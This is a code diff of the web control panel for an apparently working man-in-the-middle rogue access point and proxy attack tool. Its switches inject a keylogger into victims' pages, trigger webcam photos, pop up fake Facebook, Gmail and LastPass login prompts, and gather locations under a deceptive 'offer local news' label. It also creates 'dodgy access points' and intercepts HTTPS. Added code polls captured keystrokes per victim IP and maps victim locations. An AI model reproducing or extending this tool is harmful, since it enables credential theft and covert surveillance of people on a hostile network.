@@ -10,24 +10,34 @@
   <section class="col-md-4 proxy-controls">
     <div class="panel panel-default">
       <!-- Default panel contents -->
-      <div class="panel-heading"><h5>Proxy Controls</h5>
+      <div class="panel-heading">
+        <h5>Proxy Controls</h5>
+        <div id="spinner" style="position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px;"></div>
       </div>
 
       <!-- List group -->
       <ul class="list-group">
         <li class="list-group-item">
-          <div class="onoffswitch">
-            <input type="checkbox" name="passthrough" class="onoffswitch-checkbox" id="passthrough">
-            <label class="onoffswitch-label" for="passthrough">
+          <!-- <div class="onoffswitch">
+            <input type="checkbox" name="startSimpleProxy" class="onoffswitch-checkbox" id="startSimpleProxy">
+            <label class="onoffswitch-label" for="startSimpleProxy">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
+          </div> -->
+          <div class="onoffswitch">
+              <input type="checkbox" name="onoffswitch" class="onoffswitch-checkbox" id="toggleHarCollection">
+              <label class="onoffswitch-label" for="toggleHarCollection">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+              </label>
           </div>
-          <h4>Simple Proxy</h4>
-          <small>Allows all connections through however data will be stored as a HAR file</small>
+          <h4>Collect Requests</h4>
+          <small>Toggle the HAR collector</small>
+
         </li>
 
-        <li class="list-group-item">
+        <!-- <li class="list-group-item">
           <div class="onoffswitch">
             <input type="checkbox" name="replaceImages" class="onoffswitch-checkbox" id="replaceImages" disabled="true">
             <label class="onoffswitch-label" for="replaceImages">
@@ -36,9 +46,9 @@
             </label>
           </div>
           <h4><s>Replace All Images</s></h4>
-    <small>Replace the images on the page - disabled currently</small>
-        </li>
-        <li class="list-group-item">
+          <small>Replace the images on the page - disabled currently</small>
+        </li> -->
+        <!-- <li class="list-group-item">
           <div class="onoffswitch">
             <input type="checkbox" name="flipImages" class="onoffswitch-checkbox" id="flipImages" disabled="true">
             <label class="onoffswitch-label" for="flipImages">
@@ -47,12 +57,12 @@
             </label>
           </div>
           <h4><s>Flip Images</s></h4>
-        <small>Flip the images on the page 180 degrees - disabled currently</small>
-        </li>
+          <small>Flip the images on the page 180 degrees - disabled currently</small>
+        </li> -->
         <li class="list-group-item">
           <div class="onoffswitch">
-            <input type="checkbox" name="redirect" class="onoffswitch-checkbox" id="redirect">
-            <label class="onoffswitch-label" for="redirect">
+            <input type="checkbox" name="triggerRedirects" class="onoffswitch-checkbox" id="triggerRedirects">
+            <label class="onoffswitch-label" for="triggerRedirects">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -63,8 +73,8 @@
 
         <li class="list-group-item">
           <div class="onoffswitch">
-            <input type="checkbox" name="block" class="onoffswitch-checkbox" id="block">
-            <label class="onoffswitch-label" for="block">
+            <input type="checkbox" name="triggerBlocks" class="onoffswitch-checkbox" id="triggerBlocks">
+            <label class="onoffswitch-label" for="triggerBlocks">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -89,7 +99,7 @@
               <h4>Keylogger</h4>
               <small>Inject a keylogger into the page.</small>
             </li>
-
+<!-- 
             <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
@@ -100,7 +110,7 @@
               </div>
               <h4>Take Photo</h4>
               <small>Attempt to take a photo with the web cam on the clients computer</small>
-            </li>
+            </li> -->
 
             <li class="list-group-item">
               <div class="onoffswitch">
@@ -110,10 +120,10 @@
                   <span class="onoffswitch-switch"></span>
                 </label>
               </div>
-              <h4>Get Location</h4>
-              <small>Attempt to get the user's location</small>
+              <h4>Offer local news</h4>
+              <small>If the user is on a news site, offer local news if they share their location</small>
             </li>
-
+<!-- 
             <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="requestLogin" class="onoffswitch-checkbox" id="requestLogin">
@@ -124,7 +134,7 @@
               </div>
               <h4>Request User Login</h4>
               <small>Request user Login to facebook, gmail or hotmail/outlook</small>
-            </li>
+            </li> -->
            <li class="list-group-item">
             <div class="onoffswitch">
               <input type="checkbox" name="requestLastpass" class="onoffswitch-checkbox" id="requestLastpass">
@@ -137,10 +147,11 @@
             <small>Pop up a lastpass login on the user's screen</small>
           </li>
           </ul>
+
         <li class="list-group-item">
         <div class="onoffswitch">
-            <input type="checkbox" name="intercept" class="onoffswitch-checkbox" id="intercept">
-            <label class="onoffswitch-label" for="intercept">
+            <input type="checkbox" name="triggerWolfPack" class="onoffswitch-checkbox" id="triggerWolfPack">
+            <label class="onoffswitch-label" for="triggerWolfPack">
               <span class="onoffswitch-inner"></span>
               <span class="onoffswitch-switch"></span>
             </label>
@@ -157,11 +168,14 @@
 
       <!-- Nav tabs -->
       <ul class="nav nav-tabs" role="tablist">
-        <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li>
+        <!-- <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li> -->
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
+        <li role="presentation"><a href="#locations" onclick="mapLoad()" aria-controls="locations" role="tab" data-toggle="tab">Locations</a></li>
+        <li role="presentation"><a href="#ConnectWifi" aria-controls="ConnectWifi" role="tab" data-toggle="tab">Connect To Wifi</a></li>
+        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">Create Access Points</a></li>
         <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
-        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab"><s>Create Access Points</s></a></li>
+        
       </ul>
 
       <!-- Tab panes -->
@@ -180,13 +194,15 @@
                 </ul>
               </div>
             </div>
-            <button class="btn btn-danger" id="deletehars">Delete current data</button>
+            <!-- <button class="btn btn-danger" id="deletehars">Delete current data</button> -->
             <!-- dropdown button -->
           </nav>
 
           <div id='har-view'></div> <!-- har viewer here -->
         </div>
-
+        <div role="tabpanel" class="tab-pane" id="locations">
+          <div id="map-canvas"></div>
+        </div>
         <div role="tabpanel" class="tab-pane" id="logs">
           <div id='userLogs'></div>
         </div>
@@ -195,7 +211,40 @@
           <div id='wifi-requests'></div>
         </div>
         <div role="tabpanel" class="tab-pane" id="CreateAP">
-          <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
+          <div class="accesspoint">
+          Name: <input type="text" id="apname" class="btn .input-prepend" title="name for the wifi access point" placeholder="access point name">
+          connection: 
+          <div class="btn-group harList">
+                <button type="button" class="btn btn-default dropdown-toggle" id="connectionButton" data-toggle="dropdown" aria-expanded="false">
+                  Select Connection Type <span class="caret"></span>
+                </button>
+                <ul class="dropdown-menu" role="menu" id="connectiontype">
+                  <li><a href="#" id="connectiontypeEth0">eth0</a></li>
+                  <li><a href="#" id="connectiontypewlan1">wlan1</a></li>
+                </ul>
+              </div>
+          <button type="submit" class="btn" id="createaccesspoint">Create!</button>
+          </div>
+
+          <div>
+            <div id="wifiError" class="wifi">
+            </div>
+            <div if="wifiOutput" class="wifi">
+            </div>
+          </div>
+        </div>
+        <div role="tabpanel" class="tab-pane" id="ConnectWifi">
+          <div class="accesspoint">
+          SSID: <input type="text" id="wifiName" class="btn .input-prepend" title="ssid" placeholder="SSID">
+          PASSWORD: <input type="text" id="wifiPassword" class="btn .input-prepend" title="password" placeholder="p4ssw0rd">
+          <button type="submit" class="btn" id="connectoToWifi">Connect!</button>
+          </div>
+          <div>
+            <div id="wifiError" class="wifi">
+            </div>
+            <div if="wifiOutput" class="wifi">
+            </div>
+          </div>
         </div>
         <div role="tabpanel" class="tab-pane" id="SelectUser">
           <ul>
@@ -209,88 +258,66 @@
   </section>
 </div>
 <script type="text/javascript">
-
-  $(".toplevel").click(function() {
-    $(".btn").removeClass("btn-success")
-    $(this).addClass("btn-success")
-  })
-  $("#passthrough").click(function() {
-    $.get( "/PassThrough", function( data ) {
-    });
-  })
-  $("#deletehars").click(function() {
-     $.get( "/App/DeleteHars", function( data ) {
-      $.each(data, function(i, d) {
-        var descr = d.split("_", -1)
-        console.log(descr)
-        $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
+  //for the spinner
+var opts = {
+          lines: 11 // The number of lines to draw
+        , length: 56 // The length of each line
+        , width: 14 // The line thickness
+        , radius: 81 // The radius of the inner circle
+        , scale: 1 // Scales overall size of the spinner
+        , corners: 1 // Corner roundness (0..1)
+        , color: '#000' // #rgb or #rrggbb or array of colors
+        , opacity: 0.15 // Opacity of the lines
+        , rotate: 0 // The rotation offset
+        , direction: 1 // 1: clockwise, -1: counterclockwise
+        , speed: 1 // Rounds per second
+        , trail: 60 // Afterglow percentage
+        , fps: 20 // Frames per second when using setTimeout() as a fallback for CSS
+        , zIndex: 2e9 // The z-index (defaults to 2000000000)
+        , className: 'spinner' // The CSS class to assign to the spinner
+        , top: '50%' // Top position relative to parent
+        , left: '50%' // Left position relative to parent
+        , shadow: false // Whether to render a shadow
+        , hwaccel: false // Whether to use hardware acceleration
+        , position: 'absolute' // Element positioning
+        }
+  var target = '' //the target for the spinner is set in document.ready
+  var spinner;
+  var handleGetRequest = function(endpoint) {
+      target.style.zIndex = 1000;
+      spinner.spin(target);
+      console.log(endpoint)
+      $.get( "/"+endpoint)
+      .done(function(data) {
+        target.style.zIndex = 0;
+        spinner.stop()//stop the spinner
+        console.log(data)
       })
-    });
-  })
-  $("#intercept").click(function() {
-    $.get( "/InterceptHTTPS", function( data ) {
-    });
-  })
-  $("#flipImages").click(function() {
-    // alert("flipping images currently disabled")
-    // $.get( "/FlipImages", function( data ) {
-    //   $(".attackType").html("Flip Images")
-    // });
-  })
-  $("#replaceImages").click(function() {
-    // alert("Replacing images currently disabled")
-    // $.get( "/FlipImages", function( data ) {
-    //   $(".attackType").html("Flip Images")
-    // });
-  })
-  $("#redirect").click(function() {
-    $.get( "/RedirectPage", function( data ) {
-    });
-  })
-  $("#block").click(function() {
-    $.get( "/BlockWebsites", function( data ) {
-    });
-  })
-  $("#keylogger").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
- $("#getLocation").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
- $("#takePhoto").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-   $("#requestLogin").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-   $("#requestLastpass").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FlastpassInjection.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-  $("#getKeyLogs").click(function() {
-    $('#userLogs').html("")//clear
-      $.get("/App/GetKeylogs", function ( data ) {
-        var lastURL = data[0].Page
-        $('#userLogs').append(lastURL+"<p>")
-        $.each(data, function(i, j) {
-          if ( j.Page === lastURL ) {
-            $('#userLogs').append(j.Content)
-          } else {
-            $('#userLogs').append("<p>"+j.Page)
-            $('#userLogs').append(j.Content)
-          }
-          lastURL = j.Page
-        })
+  }
+  $("#toggleHarCollection").click( function () { handleGetRequest("ToggleHarCollection")});
 
-      })
+  $("#startSimpleProxy").click( function () { handleGetRequest("StartSimpleProxy")});
 
-  })
-  //get the hars that have been collected
-  //update for each connected client
+  $("#triggerRedirects").click( function () { handleGetRequest("TriggerRedirects") });
+
+  $("#triggerBlocks").click( function () { handleGetRequest("TriggerBlocks") });
+
+  $("#triggerWolfPack").click( function () { handleGetRequest("TriggerWolfPack") });
+
+  $("#keylogger").click( function () { handleGetRequest("TriggerInjection?trigger=keylogger") });
+
+  $("#getLocation").click( function () { handleGetRequest("TriggerInjection?trigger=getlocation"); console.log("requesting location") });
+
+  $("#takePhoto").click( function () { handleGetRequest("TriggerInjection?trigger=takephoto") });
+
+  $("#requestLogin").click( function () { handleGetRequest("TriggerInjection?trigger=requestlogin") });
+
+  $("#requestLastpass").click( function () { handleGetRequest("TriggerInjection?trigger=requestlasspass") });
+
+  $("#createaccesspoint").click( function () { handleGetRequest("CreateAccessPoint?name="+$("#apname").val()+"&connection="+connectionType) });
+
+  $("#connectoToWifi").click( function () { handleGetRequest("ConnectToWifi?wifiName="+$("#wifiName").val()+"&wifiPassword="+$("#wifiPassword").val()) });
+
   $("#gethars").click(function() {
     $("#clients").html("")
     $.getJSON("/App/GetHars", function( data ) {
@@ -298,9 +325,10 @@
     $.each(data, function(i, j) {
       var descr = j.split("_", -1)
       var listItem = $('<li><a href="#" id="'+j+'">'+descr[1]+' : ' + descr[2]+'</a></li>').click(function() {
-        $.getJSON( "/public/hars/"+j, function( data ) {
+        $.getJSON( "/GetHar/?harname="+j, function( data ) {
+          var obj = JSON.parse(data)
             initHarView();
-            har.render(data);
+            har.render(obj);
         });
       })
       $("#clients").append(listItem)
@@ -308,28 +336,7 @@
   })
   })
 
-  // bootstrap for toggle insted of click as above
-  $(function () {
-    $('.onoffswitch :checkbox').change(function() {
-        // checked true or false, id of toggle
-        console.log(this.checked, this.id);
 
-        // switch by id, then check if checked is true
-        switch(this.id) {
-            case "takePhoto":
-                console.log(this.checked, "taking the photo");
-                if(this.checked){
-                  // inject!
-                } else {
-                  // deject
-                }
-                break;
-            default:
-                console.log("toggled option that doesn't exist.")
-        }
-
-    });
-  });
 
 var har;
 function initHarView(){
@@ -340,10 +347,146 @@ function initHarView(){
    har = $('#har-view').data('HarView');
 
 }
+
+
+
+function captureKeyLogs() {
+
+  $('#userLogs').html("")//clear
+  $.get("/GetKeylogs", function ( data ) {
+
+    if (data === null) {
+      return
+    }
+
+    var theMap = {}
+
+    /*  * read in the json and create the object
+       * the format is:
+            {
+          "ip": {
+              "website": {
+                  "adomObject": [
+                      { "text":"text", "Timestamp": "timestamp"}
+                  ], 
+                  "anotherDomObject": [
+                      "array of text"
+                  ]
+              }   
+          }
+
+        }
+    */
+    $.each(data, function(k, item) { //for each item in the data from the json
+      var ip = item.IP; //store all the data objects
+      var website = item.Page;
+      var domObject = item.DomObject;
+      var content = item.Content;
+      var timestamp = item.Timestamp;
+      if (theMap[ip] == null) { //check if the map[ip] entry exists
+          theMap[ip] = {}
+      }
+      if (theMap[ip][website] == null) { //check whether the map[ip][whebsite] entry exists
+          theMap[ip][website] = {}
+      }
+      if (theMap[ip][website][domObject] == null) { //check whether the dom object for the website exists
+        theMap[ip][website][domObject] = []
+      }
+      var finalObject = {}
+      finalObject["content"] = content //create an object of content against timestamp
+      finalObject["timestamp"] = timestamp 
+      theMap[ip][website][domObject].push(finalObject) //push the object into the map
+    })
+    //once the map is created, create the dom objects to store it
+    $.each(theMap, function(k, v) {
+      var user = document.createElement("div"); //a user object for each user (ip address)
+      user.setAttribute("id", k.replace(/\./g, "_")); //set the id to the ip address
+      user.setAttribute("class", "user")
+      $(user).append("user: " + k) //set the text to the user IP
+
+      //for each website that the user visited
+      $.each(v, function(i,website) {
+        var wDiv = document.createElement("div")
+        wDiv.setAttribute("class", "website")
+        $(wDiv).append("website: " + i)
+        var w = document.createElement("ul");
+        //set the id to the website address replacing weird symbols
+        w.setAttribute("id", i.replace(/\./g, "_").replace(/\//g, "").replace(/:/g, "")); //set the id to the web address
+        //each website will have dom objects that were typed into
+        $.each(website, function(name, object){
+          var listItem = document.createElement("li")
+          listItem.setAttribute("id", name)
+          $(listItem).append(name + ": ")
+          //the data that was typed in stored in an array against the timestamp at which it was saved
+          for (var i = 0, len = object.length; i < len; i++) {
+            $(listItem).append(object[i].content)
+          }
+          $(w).append(listItem)
+        })
+        //append the website div to the website
+        $(wDiv).append(w)
+        //add that to the user object
+        $(user).append(wDiv)
+        //append the user to the page
+        $('#userLogs').append(user)
+      })
+    })
+  })
+   setTimeout(captureKeyLogs, 5000);
+}
+
 //get the latest hars that are available
 $(document).ready(function() {
   initHarView();
+  setTimeout(captureKeyLogs, 5000);
+  console.log(spinner)
+  target = document.getElementById('spinner');
+  spinner = new Spinner(opts);
+
+  connectionType = "";
+  //handle when a connection type is selected from the drop down, to create dodgy access points...
+  $('#connectiontype li > a').click(function(e){
+    console.log("selected: ", this.innerHTML);
+    connectionType = this.innerHTML;
+    $('#connectionButton').html(this.innerHTML + " <span class=\"caret\"></span>");
+  });
+
+
 })
+
+</script>
+
+
+<!-- google map -->
+
+
+<script>
+function addMarkers() {
+  $.get("/GetLocations", function ( data ) {
+    $.each(data, function(key, value){
+      console.log(value)
+      addMarker(value.Latitude, value.Longitude, value.IP)    
+    })
+  })
+  
+}
+
+  var map;
+  function initialize() {
+    map = new google.maps.Map(document.getElementById('map-canvas'), {
+      zoom: 5,
+      styles: [{"featureType":"administrative","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"administrative","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"administrative.country","elementType":"geometry.stroke","stylers":[{"visibility":"off"}]},{"featureType":"administrative.province","elementType":"geometry.stroke","stylers":[{"visibility":"off"}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"visibility":"on"},{"color":"#e3e3e3"}]},{"featureType":"landscape.natural","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"landscape.natural.landcover","elementType":"geometry.fill","stylers":[{"color":"#808285"}]},{"featureType":"poi","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"all","stylers":[{"color":"#cccccc"}]},{"featureType":"road","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"visibility":"off"}]},{"featureType":"transit.line","elementType":"labels.text","stylers":[{"visibility":"off"}]},{"featureType":"transit.station.airport","elementType":"geometry","stylers":[{"visibility":"off"}]},{"featureType":"transit.station.airport","elementType":"labels","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#FFFFFF"}]},{"featureType":"water","elementType":"labels","stylers":[{"visibility":"off"}]}],
+      center: {lat: 51.530088, lng: -0.091819}
+    });
+    addMarkers();
+  }
+
+  function mapLoad() {
+    document.getElementById('map-canvas').style.display="block";
+    initialize();
+
+  }
+
 
 </script>
 
